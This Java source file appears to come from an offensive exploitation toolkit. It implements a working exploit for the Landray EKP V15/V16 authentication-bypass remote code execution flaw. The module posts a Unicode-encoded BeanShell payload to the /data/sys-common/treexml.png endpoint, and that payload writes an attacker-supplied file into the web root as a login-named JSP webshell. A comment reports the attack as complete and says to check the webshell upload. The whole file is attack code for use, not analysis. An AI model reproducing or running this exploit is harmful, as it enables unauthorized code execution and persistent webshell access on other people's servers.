package com.droplab.Controller.BlueEkp.Service;

import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.HttpUtils;
import com.droplab.Utils.InfoUtils;
import com.droplab.Utils.ResponseUtils;
import com.droplab.service.BugService;
import org.jsoup.Connection;

import java.io.File;
import java.nio.file.Files;
import java.util.Base64;
import java.util.HashMap;
import java.util.Iterator;

/**
 * 蓝凌V15 V16 权限绕过RCE
 */
public class BlueEkpDataSysCommonTreexml extends BugService {
    private final String contentPath = "/data/sys-common/treexml.png"; //s_bean=ruleFormulaValidate&script=
    private final String payloadContent="%s(\"%s\"));bsh.close();";  //利用beanshell执行任意代码，然后unicode编码
    private final String payloadSource="import java.lang.*;import java.io.*;Class cls=Thread.currentThread().getContextClassLoader().loadClass(\"bsh.Interpreter\");String path=cls.getProtectionDomain().getCodeSource().getLocation().getPath();File f=new File(path.split(\"WEB-INF\")[0]+\"/login%s.jsp\");f.createNewFile();FileOutputStream fout=new FileOutputStream(f);fout.write(new sun.misc.BASE64Decoder().decodeBuffer";

    //java.io.PrintWriter bsh = new java.io.PrintWriter(Thread.currentThread().getContextClassLoader().loadClass("bsh.Interpreter").getProtectionDomain().getCodeSource().getLocation().getPath().split("WEB-INF")[0] + "%s.jsp");bsh.write(java.util.Base64.getDecoder().decode
    @Override
    public Object run(String type) {

        try {
            if (!params.isEmpty()) {
                String url = "";
                String filepath = "";
                String filename = "";
                Iterator<String> iterator = params.keySet().iterator();
                while (iterator.hasNext()) {
                    String key = iterator.next();
                    if (key.equals("url")) {
                        url = params.get(key);
                    }else if (key.equals("filepath")) {
                        filepath = params.get(key);
                    }else if (key.equals("filename")) {
                        filename = params.get(key);
                    }
                }
                if(!url.equals("")){
                    String format = String.format(payloadContent, CommonUtils.string2Unicode(String.format(payloadSource, filename)),
                            Base64.getEncoder().encodeToString(Files.readAllBytes(new File(filepath).toPath())));

                    HashMap paramMap = new HashMap();
                    paramMap.put("s_bean","ruleFormulaValidate");
                    paramMap.put("script",format);

                    HashMap headers = new HashMap();
                    CommonUtils.hashMapClone(InfoUtils.headers,headers);
                    headers.put("Referer",url);

                    Connection.Response response = HttpUtils.post(headers, url + contentPath, paramMap);

                    ResponseUtils responseUtils = new ResponseUtils();
                    responseUtils.setMessage("攻击完成请检查webshell是否上传成功！");
                    return responseUtils;
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}
